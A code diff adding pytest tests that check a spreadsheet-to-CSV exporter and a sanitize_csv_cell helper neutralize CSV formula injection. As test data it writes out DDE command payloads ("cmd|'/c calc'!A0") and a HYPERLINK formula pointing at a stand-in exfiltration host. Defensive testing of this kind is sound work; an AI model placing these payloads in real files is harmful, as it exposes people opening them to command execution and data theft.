@@ -222,6 +222,92 @@ class TestFormulaSerializer:
         finally:
             os.unlink(tmp_path)
 
+    def test_export_to_csv_neutralizes_formula_injection(self):
+        """
+        SECURITY: export_to_csv() must neutralize CSV/formula-injection
+        payloads (CWE-1236 / OWASP "CSV Injection").
+
+        Cell content originates from an untrusted .xlsx file. A malicious
+        workbook can contain formula text or values that start with
+        =, +, -, or @ (e.g. DDE payloads like "cmd|'/c calc'!A0" written as
+        a formula starting with '+' or '@', or a computed value equal to
+        "=HYPERLINK(...)"). If written verbatim to CSV, opening the export
+        in Excel/LibreOffice/Google Sheets executes it as a formula. Every
+        such value must come out prefixed with a leading apostrophe so it
+        is rendered as inert text.
+        """
+        malicious_rows = [
+            [{"value": "Name", "formula": None, "formula_type": None}],
+            # Formula text (no leading '=' — matches internal representation)
+            # crafted to start with each trigger character.
+            [{"value": None, "formula": "+cmd|'/c calc'!A0", "formula_type": "custom"}],
+            [{"value": None, "formula": "-2+3+cmd|'/c calc'!A0", "formula_type": "custom"}],
+            [{"value": None, "formula": "@SUM(1+1)*cmd|'/c calc'!A0", "formula_type": "custom"}],
+            # A computed value that itself is an injection payload.
+            [
+                {
+                    "value": '=HYPERLINK("http://evil.example/exfil","click")',
+                    "formula": "INDIRECT(A1)",
+                    "formula_type": "custom",
+                }
+            ],
+        ]
+
+        with tempfile.NamedTemporaryFile(suffix=".csv", delete=False) as tmp:
+            tmp_path = tmp.name
+
+        try:
+            FormulaSerializer.export_to_csv(malicious_rows, tmp_path)
+
+            with open(tmp_path, newline="") as f:
+                raw = f.read()
+
+            # The raw payloads must never appear unescaped/unprefixed —
+            # i.e. never immediately following a CSV field-start quote/comma
+            # with the trigger character as the first character of the field.
+            assert ',"+cmd' not in raw
+            assert ',"-2+3' not in raw
+            assert ',"@SUM' not in raw
+            assert '"=HYPERLINK' not in raw
+
+            # And the neutralized (apostrophe-prefixed) forms must be present.
+            assert "'+cmd|'/c calc'!A0" in raw
+            assert "'-2+3+cmd|'/c calc'!A0" in raw
+            assert "'@SUM(1+1)*cmd|'/c calc'!A0" in raw
+            assert "'=HYPERLINK(" in raw
+
+            # Round-trip through csv.reader to confirm each affected field's
+            # first character is now a literal apostrophe, not the trigger.
+            import csv as _csv
+
+            with open(tmp_path, newline="") as f:
+                rows = list(_csv.reader(f))
+            data_rows = rows[1:]
+            assert data_rows[0][2].startswith("'+")
+            assert data_rows[1][2].startswith("'-")
+            assert data_rows[2][2].startswith("'@")
+            assert data_rows[3][4].startswith("'=")
+        finally:
+            os.unlink(tmp_path)
+
+    def test_sanitize_csv_cell_directly(self):
+        """Unit-level check of the sanitizer used by export_to_csv()."""
+        from streamxl.security import sanitize_csv_cell
+
+        assert sanitize_csv_cell("=cmd|'/c calc'!A0") == "'=cmd|'/c calc'!A0"
+        assert sanitize_csv_cell("+1+1") == "'+1+1"
+        assert sanitize_csv_cell("-1+1") == "'-1+1"
+        assert sanitize_csv_cell("@SUM(1+1)") == "'@SUM(1+1)"
+        assert sanitize_csv_cell("\tevil") == "'\tevil"
+        assert sanitize_csv_cell("\revil") == "'\revil"
+        # Safe values pass through untouched.
+        assert sanitize_csv_cell("Alice") == "Alice"
+        assert sanitize_csv_cell("SUM(A1:A10)") == "SUM(A1:A10)"
+        assert sanitize_csv_cell(None) is None
+        assert sanitize_csv_cell(-42) == -42
+        assert sanitize_csv_cell(3.14) == 3.14
+        assert sanitize_csv_cell("") == ""
+
     def test_import_formulas(self, sample_rows_with_metadata):
         """Import formulas from JSON file."""
         with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tmp:
